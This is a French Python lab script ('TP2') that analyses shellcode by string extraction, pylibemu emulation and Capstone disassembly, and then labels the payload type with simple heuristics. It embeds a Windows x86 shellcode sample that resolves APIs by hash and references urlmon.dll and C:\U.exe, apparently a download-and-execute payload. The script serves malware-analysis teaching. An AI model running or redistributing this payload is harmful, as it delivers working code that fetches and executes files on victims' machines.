"""
TP2 - Analyse de shellcode avec pylibemu
Détecte et analyse des shellcodes

Auteur: Kano COULIBALY
Date: Mars 2026
"""

import pylibemu
from capstone import *
import logging
import sys
import argparse

logging.basicConfig(level=logging.INFO, format='<Logger> - %(message)s')
logger = logging.getLogger("TP2")


SHELLCODES = {
    "facile": (
        b"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03\xF5\x33\xC9\x49\x41\xAD\x33\xDB"
        b"\x36\x0F\xBE\x14\x28\x38\xF2\x74\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
        b"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E"
        b"\x2E\x64\x6C\x6C\x00\x43\x3A\x5C\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
        b"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E"
        b"\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
        b"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB\x24\x53\xFF\xD0\x5D\xBF\x98\xFE"
        b"\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
        b"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF"
    )
}


def get_shellcode_strings(shellcode):
    """
    Extrait les chaînes ASCII du shellcode.
    
    Args:
        shellcode: Bytes du shellcode
        
    Returns:
        list: Liste des chaînes trouvées
    """
    strings = []
    current = []
    
    for byte in shellcode:
        if 32 <= byte <= 126:
            current.append(chr(byte))
        else:
            if len(current) >= 4:
                strings.append(''.join(current))
            current = []
    
    if len(current) >= 4:
        strings.append(''.join(current))
    
    return strings


def get_pylibemu_analysis(shellcode):
    """
    Analyse le shellcode avec pylibemu.
    
    Args:
        shellcode: Bytes du shellcode
        
    Returns:
        str: Résultat de l'analyse pylibemu
    """
    try:
        emulator = pylibemu.Emulator()
        offset = emulator.shellcode_getpc_test(shellcode)
        
        if offset is not None and offset >= 0:
            emulator.prepare(shellcode, offset)
            emulator.test()
            
            if hasattr(emulator, 'emu_profile_output'):
                output = emulator.emu_profile_output
                if isinstance(output, bytes):
                    return output.decode('utf-8', errors='ignore')
                return str(output)
            else:
                return "Shellcode valide detecte"
        else:
            return "Pas de shellcode detecte"
            
    except Exception as e:
        return f"Erreur pylibemu: {e}"


def get_capstone_analysis(shellcode, max_inst=50):
    """
    Désassemble le shellcode avec Capstone.
    
    Args:
        shellcode: Bytes du shellcode
        max_inst: Nombre max d'instructions
        
    Returns:
        str: Code assembleur désassemblé
    """
    try:
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        asm_code = []
        count = 0
        
        for i in md.disasm(shellcode, 0x0):
            if count >= max_inst:
                asm_code.append("...")
                break
            asm_code.append(f"0x{i.address:04x}:  {i.mnemonic:8s} {i.op_str}")
            count += 1
        
        return "\n".join(asm_code) if asm_code else "Impossible de desassembler"
        
    except Exception as e:
        return f"Erreur capstone: {e}"


def get_llm_analysis(shellcode, strings, pylibemu_out, capstone_out):
    """
    Génère une analyse du shellcode.
    
    Args:
        shellcode: Bytes du shellcode
        strings: Chaînes extraites
        pylibemu_out: Sortie de pylibemu
        capstone_out: Sortie de capstone
        
    Returns:
        str: Analyse du shellcode
    """
    analysis = []
    
    analysis.append("=== ANALYSE DU SHELLCODE ===\n")
    analysis.append(f"Taille: {len(shellcode)} bytes")
    
    if strings:
        analysis.append(f"\nChaines detectees: {', '.join(strings)}")
        
        if any('.dll' in s.lower() for s in strings):
            analysis.append("- Presence de DLL Windows detectee")
        if any('.exe' in s.lower() for s in strings):
            analysis.append("- Presence d'executable Windows detecte")
    
    if "LoadLibrary" in pylibemu_out:
        analysis.append("\n- Le shellcode charge une bibliotheque dynamique")
    if "CreateProcess" in pylibemu_out:
        analysis.append("- Le shellcode cree un nouveau processus")
    if "WinExec" in pylibemu_out:
        analysis.append("- Le shellcode execute une commande")
    
    if "urlmon" in pylibemu_out.lower():
        analysis.append("\nType: Shellcode de telechargement (URLDownloadToFile)")
        analysis.append("Fonctionnalite: Telecharge et execute un fichier depuis Internet")
    elif "ws2_32" in pylibemu_out.lower() or "WSA" in pylibemu_out:
        analysis.append("\nType: Shellcode reseau (reverse shell ou bind shell)")
        analysis.append("Fonctionnalite: Etablit une connexion reseau")
    elif "kernel32" in pylibemu_out.lower() and "CreateProcess" in pylibemu_out:
        analysis.append("\nType: Shellcode d'execution de commande")
        analysis.append("Fonctionnalite: Execute un programme ou une commande systeme")
    else:
        analysis.append("\nType: Shellcode generique")
        analysis.append("Comportement: Analyse partielle, utilise des techniques d'obfuscation")
    
    analysis.append("\n=== CONCLUSION ===")
    analysis.append("Ce shellcode est potentiellement malveillant.")
    analysis.append("Analyse realisee dans un environnement controle.")
    
    return "\n".join(analysis)


def analyze_shellcode(shellcode, name="shellcode"):
    """
    Analyse complète d'un shellcode.
    
    Args:
        shellcode: Bytes du shellcode
        name: Nom du shellcode
    """
    logger.info(f"Testing shellcode '{name}' of size {len(shellcode)}B")
    
    print("\n" + "="*70)
    print(f"ANALYSE DU SHELLCODE: {name}")
    print("="*70)
    
    logger.info("Extraction des chaines...")
    strings = get_shellcode_strings(shellcode)
    if strings:
        print(f"\nChaines trouvees: {strings}")
    else:
        print("\nAucune chaine lisible trouvee")
    
    logger.info("Analyse avec pylibemu...")
    pylibemu_out = get_pylibemu_analysis(shellcode)
    print(f"\n--- Analyse Pylibemu ---")
    print(pylibemu_out[:500] if len(pylibemu_out) > 500 else pylibemu_out)
    if len(pylibemu_out) > 500:
        print("...")
    
    logger.info("Desassemblage avec capstone...")
    capstone_out = get_capstone_analysis(shellcode)
    print(f"\n--- Instructions assembleur ---")
    print(capstone_out)
    
    logger.info("Generation de l'analyse...")
    llm = get_llm_analysis(shellcode, strings, pylibemu_out, capstone_out)
    print(f"\n{llm}")
    
    logger.info("Shellcode analyse!")
    print("\n" + "="*70 + "\n")


def main():
    """Programme principal."""
    parser = argparse.ArgumentParser(description='Analyse de shellcode avec pylibemu')
    parser.add_argument('-l', '--level', choices=['facile'], 
                       default='facile', help='Niveau de difficulte')
    
    args = parser.parse_args()
    
    print("="*70)
    print("     TP2 - ANALYSE DE SHELLCODE")
    print("="*70)
    
    analyze_shellcode(SHELLCODES[args.level], f"shellcode_{args.level}")


if __name__ == "__main__":
    main()
